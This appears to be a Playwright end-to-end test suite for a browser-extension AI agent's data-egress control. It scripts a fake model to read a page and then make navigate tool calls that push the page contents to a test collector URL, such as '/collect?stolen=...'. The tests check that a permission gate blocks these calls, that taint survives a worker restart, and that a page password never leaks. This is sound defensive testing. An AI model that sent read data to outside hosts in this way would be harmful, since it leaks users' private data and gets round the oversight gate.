/**
 * TEST-E2E-007 — data egress control in real Chromium (B2 step 11).
 *
 * Unit tests establish what the gate decides. These establish what the browser
 * actually did, which is a different claim: a blocked transfer must produce
 * zero requests at the destination, observed by the destination itself rather
 * than inferred from the extension's own report.
 */
import type { BrowserContext, Page, Worker } from '@playwright/test';
import { connectProvider, expect, test, waitForTask } from './fixtures/extension';

/**
 * Terminates the worker the way Chrome's eviction does, leaving the extension
 * installed and its storage intact. Same mechanism as `mv3-lifecycle`.
 */
async function killServiceWorker(context: BrowserContext, worker: Worker): Promise<void> {
  const cdp = await context.browser()!.newBrowserCDPSession();
  const { targetInfos } = await cdp.send('Target.getTargets');
  const target = targetInfos.find(
    (info) => info.type === 'service_worker' && info.url === worker.url(),
  );
  if (!target) throw new Error('No service worker target to terminate.');
  await cdp.send('Target.closeTarget', { targetId: target.targetId });
  await cdp.detach();
  await new Promise((r) => setTimeout(r, 800));
}

async function openPanel(context: BrowserContext, extensionId: string): Promise<Page> {
  const panel = await context.newPage();
  await panel.goto(`chrome-extension://${extensionId}/src/sidepanel/index.html`);
  await panel.waitForSelector('.app', { timeout: 15_000 });
  await new Promise((r) => setTimeout(r, 1200));
  return panel;
}

async function ask<T>(panel: Page, type: string, payload: unknown = {}): Promise<T> {
  const envelope: { ok: boolean; value?: unknown; error?: { userMessage?: string } } =
    await panel.evaluate(
      ([messageType, messagePayload]) =>
        chrome.runtime.sendMessage({
          id: `e2e_${Math.random().toString(36).slice(2)}`,
          type: messageType,
          timestamp: Date.now(),
          payload: messagePayload,
        }),
      [type, payload] as const,
    );
  if (!envelope?.ok) throw new Error(`${type} failed: ${envelope?.error?.userMessage ?? ''}`);
  return envelope.value as T;
}

/**
 * Answers the pending permission prompt, as the side panel's UI would.
 *
 * Polls because the prompt appears only once the gate has decided the
 * transfer needs one. Returns the prompt so a test can assert on its wording.
 */
async function answerPrompt(
  send: (type: 'permission.listPending' | 'permission.respond', payload: unknown) => Promise<never>,
  kind: 'approve_once' | 'deny',
): Promise<{ tool: string; reason: string }> {
  for (let attempt = 0; attempt < 100; attempt += 1) {
    const { requests } = (await send('permission.listPending', {})) as unknown as {
      requests: { id: string; tool: string; reason: string }[];
    };
    const pending = requests[0];
    if (pending) {
      await send('permission.respond', { requestId: pending.id, response: { kind } });
      return { tool: pending.tool, reason: pending.reason };
    }
    await new Promise((r) => setTimeout(r, 100));
  }
  throw new Error('No permission prompt appeared; the transfer was not gated.');
}

test('a clean task may navigate to another origin', async ({
  context,
  send,
  provider,
  site,
  collector,
}) => {
  const page = await context.newPage();
  await page.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
  await page.bringToFront();

  await connectProvider(send, provider);
  provider.script([
    {
      kind: 'tool_calls',
      calls: [{ name: 'browser_navigate', arguments: { url: `${collector.baseUrl}/landing` } }],
    },
    { kind: 'text', text: 'Navigated.' },
  ]);

  const { task } = await send('task.create', { objective: 'Open the other site.' });
  const finished = await waitForTask(send, task.id);

  expect(finished.state).toBe('COMPLETED');
  // Nothing sensitive had been read, so this is an ordinary navigation and it
  // really happened — the control is not simply blocking everything.
  expect(collector.hitsContaining('/landing').length).toBeGreaterThan(0);
});

test('a tainted query parameter never reaches the destination', async ({
  context,
  send,
  provider,
  site,
  collector,
}) => {
  const page = await context.newPage();
  await page.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
  await page.bringToFront();

  await connectProvider(send, provider);
  provider.script([
    // Read first, so the task holds page-derived data.
    { kind: 'tool_calls', calls: [{ name: 'browser_read_page', arguments: {} }] },
    {
      kind: 'tool_calls',
      calls: [
        {
          name: 'browser_navigate',
          arguments: { url: `${collector.baseUrl}/collect?stolen=widget-catalogue-contents` },
        },
      ],
    },
    { kind: 'text', text: 'Done.' },
  ]);

  const { task } = await send('task.create', { objective: 'Read the page, then navigate.' });

  // The transfer is held for a decision rather than performed and reported.
  const prompt = await answerPrompt(send as never, 'deny');
  expect(prompt.tool).toBe('browser.navigate');
  // Nothing had reached the destination while the prompt was open.
  expect(collector.requests).toHaveLength(0);

  const finished = await waitForTask(send, task.id);
  expect(finished.result?.blockedActions.join(' ')).toContain('browser.navigate');

  // And the destination still saw nothing. This is the assertion that
  // matters: a request sent and then discarded would leave a hit here.
  expect(collector.requests).toHaveLength(0);
  expect(collector.hitsContaining('stolen')).toHaveLength(0);
});

test('a tainted cross-site form write never reaches the destination', async ({
  context,
  send,
  provider,
  site,
  collector,
}) => {
  const page = await context.newPage();
  await page.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
  await page.bringToFront();

  await connectProvider(send, provider);
  provider.script([
    { kind: 'tool_calls', calls: [{ name: 'browser_read_page', arguments: {} }] },
    {
      kind: 'tool_calls',
      calls: [
        {
          name: 'browser_navigate',
          arguments: { url: `${collector.baseUrl}/form#widget-catalogue-contents` },
        },
      ],
    },
    { kind: 'text', text: 'Done.' },
  ]);

  const { task } = await send('task.create', { objective: 'Read, then post elsewhere.' });
  await answerPrompt(send as never, 'deny');
  await waitForTask(send, task.id);

  expect(collector.requests).toHaveLength(0);
});

test('taint survives a real worker restart, so the refusal survives with it', async ({
  context,
  serviceWorker,
  extensionId,
  send,
  provider,
  site,
  collector,
}) => {
  const page = await context.newPage();
  await page.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
  await page.bringToFront();

  await connectProvider(send, provider);
  provider.script([
    { kind: 'tool_calls', calls: [{ name: 'browser_read_page', arguments: {} }] },
    { kind: 'text', text: 'Read it.' },
  ]);

  const { task } = await send('task.create', { objective: 'Read the page.' });
  await waitForTask(send, task.id);

  // The record must carry what the task read, not just the runtime.
  const before = await send('task.get', { taskId: task.id });
  expect(before.task?.taintState.kind).toBe('TAINTED');

  await killServiceWorker(context, serviceWorker);
  const panel = await openPanel(context, extensionId);

  const after = await ask<{ task: { taintState: { kind: string } } }>(panel, 'task.get', {
    taskId: task.id,
  });
  // Before B2 this came back empty, and a resumed task evaluated as though it
  // had read nothing — a restart made the agent less restricted, not more.
  expect(after.task.taintState.kind).toBe('TAINTED');
  expect(collector.requests).toHaveLength(0);
});

test('an egress decision is recorded without the payload it describes', async ({
  context,
  send,
  provider,
  site,
}) => {
  const page = await context.newPage();
  await page.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
  await page.bringToFront();

  await connectProvider(send, provider);
  provider.script([
    { kind: 'tool_calls', calls: [{ name: 'browser_read_page', arguments: {} }] },
    { kind: 'text', text: 'Read it.' },
  ]);

  const { task } = await send('task.create', { objective: 'Read the page.' });
  await waitForTask(send, task.id);

  const { evidence } = await send('evidence.listForTask', { taskId: task.id });
  const decisions = evidence.filter((item) => item.type === 'EGRESS_DECISION');
  expect(decisions.length).toBeGreaterThan(0);

  const payload = await send('evidence.getPayload', { evidenceId: decisions[0]!.id });
  expect(payload.content).not.toBeNull();
  const detail = JSON.parse(payload.content!) as {
    payloadDigest?: string;
    summary: string;
    destinationIdentity: string;
    verdict: string;
  };

  // Enough to audit the decision...
  expect(detail.destinationIdentity).toContain('openai-compatible@');
  expect(detail.verdict).toBe('allow');
  expect(detail.payloadDigest).toMatch(/^[0-9a-f]{64}$/);

  // ...and none of what was sent. The summary is drawn from a fixed
  // vocabulary, so it cannot quote the body even accidentally.
  expect(detail.summary).toMatch(/^(no payload|text, \d+ characters|a record with \d+ fields)$/);
  expect(payload.content).not.toContain('Widget Catalogue');
  expect(payload.content).not.toContain('hunter2');
});

test('the password on the page never reaches the provider or the collector', async ({
  context,
  send,
  provider,
  site,
  collector,
}) => {
  const page = await context.newPage();
  await page.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
  await page.bringToFront();

  await connectProvider(send, provider);
  provider.script([
    { kind: 'tool_calls', calls: [{ name: 'browser_read_page', arguments: {} }] },
    { kind: 'text', text: 'Read it.' },
  ]);

  const { task } = await send('task.create', { objective: 'Read the page.' });
  await waitForTask(send, task.id);

  const bodies = JSON.stringify(provider.requests);
  expect(bodies).not.toContain('hunter2-do-not-leak');
  expect(collector.hitsContaining('hunter2')).toHaveLength(0);
});
